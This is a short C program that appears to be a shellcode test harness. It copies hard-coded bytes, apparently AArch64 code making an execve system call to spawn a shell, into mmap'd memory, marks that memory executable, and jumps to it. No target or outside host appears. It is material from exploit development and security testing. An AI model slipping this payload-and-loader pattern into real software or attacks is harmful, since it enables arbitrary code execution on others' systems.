#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

int main() {
    unsigned char shellcode[] = 
        "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
        "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
        "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

    size_t len = sizeof(shellcode) - 1;

    void *buf = mmap(NULL, len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    memcpy(buf, shellcode, len);

    if (mprotect(buf, len, PROT_READ | PROT_EXEC) != 0) {
        perror("mprotect");
        exit(1);
    }

    ((void(*)())buf)();  // Execute the shellcode

    return 0;
}
